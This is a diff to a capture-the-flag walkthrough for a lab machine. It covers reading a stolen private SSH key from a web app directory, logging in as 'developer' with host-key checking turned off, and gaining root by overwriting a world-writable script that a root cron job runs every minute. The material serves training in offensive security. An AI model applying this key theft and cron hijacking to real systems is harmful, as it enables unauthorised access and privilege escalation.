@@ -135,18 +135,21 @@ cat /var/www/app/.env
 #   DEPLOY_USER=developer   (all passwords redacted here, they're real in-game)
 
 ls -la /var/www/app/developer_key*   # private key readable by www-data
-cat /var/www/app/config/backup.ini   # (readable later as developer: 640)
 
-# from inside the container shell — SSH to localhost with the stolen key
-ssh -i /var/www/app/developer_key developer@127.0.0.1
+# ✅ Path A (recommended — no key transfer, zero permission hassle):
+#    from the www-data reverse shell, SSH to localhost with the stolen key.
+#    The key is already mode 600 owned by www-data inside the container.
+ssh -i /var/www/app/developer_key -o StrictHostKeyChecking=no developer@127.0.0.1
+
+# ⚠️ Path B — if you copy the key to YOUR machine instead:
+#    OpenSSH refuses keys that are readable by group/others (too-open perms).
+#    You MUST tighten them first, otherwise ssh falls back to asking a password:
+#        chmod 600 developer_key
+#        ssh -i developer_key developer@<host> -p 2222
+cat /var/www/app/config/backup.ini   # (readable later as developer)
 ```
 
 As **developer**:
-
-> ⚠️ If you copied the key to your own machine, `ssh` refuses to use it unless it's
-> protected: `chmod 600 developer_key` first.
-> From a web-shell/container RCE you can use the key directly: it sits at
-> `/var/www/app/developer_key` owned by `www-data` (600).
 
 ```bash
 whoami                     # developer
@@ -178,10 +181,11 @@ cat /opt/t3rmx/services/maintenance/runtime/logs/notes.txt
 ## Step 7 — Escalate to root (777 + root cron) → root flag
 
 `/opt/t3rmx/services/maintenance/runtime/scripts` is **world-writable (777)** and a
-root cron (`/etc/cron.d/t3rmx-maintenance`) executes `cleanup.sh` from it nightly:
+root cron (`/etc/cron.d/t3rmx-maintenance`) executes `cleanup.sh` from it **every
+minute**:
 
 ```bash
-cat /etc/cron.d/t3rmx-maintenance    # 0 2 * * * root cleanup.sh
+cat /etc/cron.d/t3rmx-maintenance    # * * * * * root cleanup.sh
 ```
 
 Overwrite `cleanup.sh` with a payload that root will run (use the same 777 dir so
@@ -197,8 +201,7 @@ EOF
 chmod +x /opt/t3rmx/services/maintenance/runtime/scripts/cleanup.sh
 ```
 
-Wait for the 02:00 cron run (or restart cron / the CTF master may trigger it),
-then:
+Cron fires once a minute — within a minute root will run your payload, then:
 
 ```bash
 cat /tmp/rootflag.txt    # ⭐ FLAG 3  (root)
